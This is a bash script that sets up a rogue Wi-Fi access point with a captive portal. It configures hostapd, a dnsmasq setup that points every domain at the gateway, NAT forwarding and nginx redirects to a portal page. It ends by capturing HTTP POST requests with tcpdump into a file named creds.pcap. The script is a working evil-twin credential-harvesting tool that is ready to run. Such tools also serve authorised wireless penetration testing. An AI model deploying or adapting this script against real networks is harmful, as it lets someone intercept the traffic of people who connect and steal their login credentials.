#!/bin/bash

if [[ $EUID -ne 0 ]]; then
  echo "Script must be run as a root user" 2>&1
  exit 1
fi

echo -n "Enter the AP device name [ENTER]: "
read accesspoint
echo

echo -n "Enter the uplink device name [ENTER]: "
read uplink
echo

func_create_ap_config() {
cat > /opt/ap/hostapd.conf <<EOF
interface=$accesspoint
driver=nl80211
ssid=testwifi
hw_mode=g
channel=7
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
EOF
}

func_create_dnsmasq_profile() {
cat > /opt/ap/dnsmasq.conf <<EOF
interface=$accesspoint
dhcp-range=192.168.30.2,192.168.30.230,255.255.255.0,12h
dhcp-option=3,192.168.30.1
dhcp-option=6,192.168.30.1
server=8.8.8.8
server=8.8.4.4
log-queries
log-dhcp
listen-address=127.0.0.1
listen-address=192.168.30.1
address=/#/192.168.30.1
conf-file=/opt/ap/dnsmasq.blacklist.txt
log-facility=/opt/ap/dnsmasq.log
dhcp-option=114,http://go.rogueportal/index.html
EOF
}

func_ip_setup() {
ip a a 192.168.30.1/24 dev wlan0
route add -net 192.168.30.0 netmask 255.255.255.0 gw 192.168.30.1
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables --table nat --append POSTROUTING --out-interface $uplink -j MASQUERADE
iptables --append FORWARD --in-interface $accesspoint -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
}

func_kill_conflicts() {
#stops NetworkManage conflict
sudo nmcli device set ifname $accesspoint managed no
#stops airmon conflict
sudo airmon-ng stop ${accesspoint}mon
#Mainly for Ubuntu stops systemd-resolved as it conflicts with dnsmasq
systemctl stop systemd-resolved
}

func_apache() {
cat > /etc/nginx/sites-available/default << EOF
# Default server configuration
# This handles any request not made using the go.rogueportal server name and
# serves a redirect to go.rogueportal.
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name _;

    # Only allow GET, HEAD, POST
    if (\$request_method !~ ^(GET|HEAD|POST)$) { return 444; }

    # Logs
    access_log /var/log/nginx/rogueportal_redirect.access.log;
    error_log /var/log/nginx/rogueportal_redirect.error.log warn;

    # Handle iOS
    if (\$http_user_agent ~* (CaptiveNetworkSupport) ) {
        return 302 http://go.rogueportal;
    }

    # Default redirect for any unexpected requests to trigger captive portal
    # sign in screen on device.
    location / {
        return 302 http://go.rogueportal;
    }
}
EOF

cat > /etc/nginx/sites-available/roguecontent << EOF
# The go.rogueportal server
# This handles any request that includes go.rogueportal as the server name.
# You can update this to serve your own content, proxy to another server, etc.
server {
    listen 80;
    listen [::]:80;
    server_name go.rogueportal;

    # Only allow GET, HEAD, POST
    if (\$request_method !~ ^(GET|HEAD|POST)$) { return 444; }

    # Logs
    access_log /var/log/nginx/rogueportal.access.log;
    error_log /var/log/nginx/rogueportal.error.log warn;

    root /var/www/html;

    index index.html;

    location / {
        # First attempt to serve request as file, then
        # as directory, then fall back to displaying a 404.
        try_files \$uri \$uri/ =404;
    }

    # Redirect these errors to the home page.
    error_page 401 403 404 =200 /index.html;
}
EOF
ln -s /etc/nginx/sites-available/roguecontent /etc/nginx/sites-enabled/roguecontent
}

mkdir /opt/ap
func_create_ap_config
func_create_dnsmasq_profile
func_ip_setup
func_kill_conflicts
func_apache
hostapd /opt/ap/hostapd.conf -B -f /opt/ap/ap.log
dnsmasq -C /opt/ap/dnsmasq.conf
echo "To kill the processes use the following commands:"
echo
echo "pkill -f hostapd"
echo
echo "pkill -f dnsmasq"
tcpdump -i $accesspoint -s 0 -A 'tcp dst port 80 and tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504F5354' -w /opt/ap/creds.pcap